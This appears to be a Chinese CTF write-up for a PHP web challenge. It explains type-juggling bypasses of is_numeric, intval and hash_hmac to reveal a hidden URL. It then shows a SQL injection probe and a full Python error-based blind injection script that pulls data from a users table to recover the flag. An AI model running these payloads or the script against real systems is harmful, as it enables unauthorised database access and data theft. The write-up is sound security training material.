# web5  wp

# 0x1 代码审计

```php

<?php

include "secret.php";

error_reporting(0);
 
if(empty($_GET)) 
{
    highlight_file(__FILE__);
    die("get get get get args");
}
$a1=$_GET['a1'];
$a2=$_GET['a2'];
$a3=$_GET['a3'];
$a4=$_GET['a4'];
$obstacle_1=is_numeric($a2) and is_numeric($a1);
if(!$obstacle_1) exit("foolish");

if(!(intval($a2)<1024 and intval($a2+1)>1024)) exit("emmmmm");

if(isset($a1))
{
    $secret=hash_hmac('sha256',$a1,$secret);
}
$hmac=hash_hmac(sha256,$a2,$secret);
if($a3!==$hmac)
{

    die("OMG");
}

echo "gogogo   ".$url;

?>

```

题目的总体思路:  绕过一些phptips的限制然后获取`secret.php` 里面的`$url`变量

这里有3个点:

1.

`$obstacle_1=is_numeric($a2) and is_numeric($a1);` 这里可以利用`a1[]=1&a2=0x1234`进行绕过 因为他也会遍历数组的解析16进制



2.

`(intval($a2)<1024 and intval($a2+1)>1024)`

这个绕过

`var_dump(intval('0x1234'+1));` =>  `int 4661`

`var_dump(intval('0x1234'+1))`=> 0

这个主要是php若类型转换导致的问题 再解析+运算的时候进行了解析hex类型转换。 intval的话就是直接字符串强制转换为0 导致了绕过

3.

```php
if(isset($a1))
{
    $secret=hash_hmac('sha256',$a1,$secret);
}
$hmac=hash_hmac(sha256,$a2,$secret);
if($a3!==$hmac)
```

这里a1可控传入数组的时候为空 导致 `$secre` 为空 `hash_hmac` 这个函数没办法对数组进行加密直接返回NULL



`var_dump(hash_hmac('sha256','0x1234', NULL));`

```php
/Users/xq17/www/ciscn1/test.php:2:string 'acd02790bfac26ce533b69e4be51b8748c07812c26ea3901c1ca354f4f67e993' (length=64)
```

然后构造下`a3=acd02790bfac26ce533b69e4be51b8748c07812c26ea3901c1ca354f4f67e993`即可完整绕过得到url

```php
http://172.29.14.105/?a1[]=1&a2=0x1234&a3=acd02790bfac26ce533b69e4be51b8748c07812c26ea3901c1ca354f4f67e993
```

访问网址

`xinqingfuza2019qwieasjkdnzx.php`

`http://172.29.14.105/xinqingfuza2019qwieasjkdnzx.php`

手工测试一波:

`-1' union select 1,2 from article#`

确定了是个注入,这里有两种做法 sleep或者 国赛初赛那样子 报错注入

表名是通过 

```php
-1' union select 1,2 from users#
```

然后burp爆破就可以得到。

这里我直接用国赛的初赛脚本改改就能跑出来

```python
#!/usr/bin/python2.7
#coding:utf-8

from sys import *
import requests
import string
import re
# import hackhttp

# host = ''
# port = int(argv[2])
timeout = 30

string = string.digits + string.ascii_letters + string.punctuation
# string = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{'
paramsPostBase = {"usr":"1"}
# payloadBase = "-1'^(((lpad((select/**/`1`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),{pos},'0')>'{password}')+1)*1e308)^'1"
# payloadBase = "-1'^(((lpad((select/**/`1`/**/from/**/(select/**/1,2,3,4,5,6/**/union/**/select/**/*/**/from/**/mysql.innodb_table_stats)a/**/limit/**/1,1),{pos},'0')>'{password}')+1)*1e308)^'1"
payloadBase = "-1'^(((substr((select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/2,1),{pos},1)>'{password}')+1)*1e308)^'1"

def getPass(url):
  # 获取password
  url = url + 'xinqingfuza2019qwieasjkdnzx.php'
  password = ""
  for i in range(1,27):
    for s in string:
      password = str(password + s)
      payload = payloadBase.format(pos=i, password=s)
      paramsPostBase['usr'] = payload
      # print paramsPostBase
      resp = requests.post(url=url, data=paramsPostBase,timeout=timeout)
      # print resp.content
      # exit()
      if '数据库操作异常' in resp.content:
        password = password[:-1]
      else:
        print 'pass:' + password
        break

```

```
pass:636973636e7b7157794a4566755348655a54384a44554b447d00000000000000
```

最后火狐hexdecode即可解决问题。






